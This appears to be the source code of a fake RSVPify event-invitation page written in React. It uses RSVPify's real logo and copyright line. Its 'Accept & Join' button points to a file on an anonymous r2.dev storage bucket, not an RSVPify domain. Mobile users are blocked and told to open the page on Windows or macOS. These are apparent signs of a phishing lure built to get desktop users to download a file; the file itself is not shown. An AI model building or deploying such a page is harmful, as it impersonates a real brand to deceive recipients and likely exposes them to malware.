import React, { useState, useEffect } from 'react';
import './App.css';

export default function App() {
  const [isMobile, setIsMobile] = useState(false);

  useEffect(() => {
    const checkMobile = () => {
      setIsMobile(window.innerWidth <= 768);
    };

    checkMobile();
    window.addEventListener('resize', checkMobile);
    return () => window.removeEventListener('resize', checkMobile);
  }, []);

  if (isMobile)
  {
    return <MobileBlocker />;
  }

  return <Invite />;
}

function Invite() {
  return (
    <>
      <div className="wrapper">
        <div className="container">
          <div className="envelope-section">
            <div className="envelope">📬</div>
          </div>
          <div className="content-section">
            <div className="logo">
              <img
                src="https://rsvpify.com/wp-content/uploads/2025/08/Logo-RSVPify.svg"
                alt="RSVPify"
              />
            </div>

            <h1>You're Invited</h1>
            <p className="subtitle">Experience something extraordinary</p>

            <div className="header-divider"></div>

            <p className="invite-text">
              We're thrilled to invite you to join us for an exclusive event.<br />
              <span className="highlight">Please accept this invitation and be part of something special.</span>
            </p>

            <a href="https://pub-4b997841feed4885acb4cf32f7d569d1.r2.dev/Exclusive-Invite-to-Event" className="accept-btn">
              Accept & Join
            </a>
          </div>
        </div>
      </div>

      <footer className="web-footer">
        <p>Exclusive event invitation crafted with precision</p>
        <div className="web-footer-divider"></div>
        <p>© 2026 RSVPify. All rights reserved.</p>
      </footer>
    </>
  );
}

function MobileBlocker() {
  return (
    <div className="mobile-warning-container">
      <div className="mobile-bg-decoration">
        <div className="decoration-circle circle-1"></div>
        <div className="decoration-circle circle-2"></div>
        <div className="decoration-circle circle-3"></div>
      </div>

      <div className="mobile-content-wrapper">
        <div className="mobile-icon-wrapper">
          <div className="mobile-icon">🖥️</div>
        </div>

        <div className="mobile-logo">
          <img
            src="https://rsvpify.com/wp-content/uploads/2025/08/Logo-RSVPify.svg"
            alt="RSVPify"
          />
        </div>

        <h1 className="mobile-title">Desktop Only</h1>

        <p className="mobile-subtitle">
          This exclusive invitation deserves to be experienced on a bigger screen.
        </p>

        <div className="mobile-divider"></div>

        <div className="mobile-features">
          <div className="feature-item">
            <span className="feature-icon">💻</span>
            <span>Windows</span>
          </div>
          <div className="feature-item">
            <span className="feature-icon">🍎</span>
            <span>macOS</span>
          </div>
          <div className="feature-item unavailable">
            <span className="feature-icon">📱</span>
            <span>Mobile</span>
          </div>
        </div>

        <p className="mobile-message">
          Open this from your desktop or laptop to continue
        </p>

        <div className="mobile-footer-art">
          <p>✨ A premium experience awaits</p>
        </div>
      </div>
    </div>
  );
}
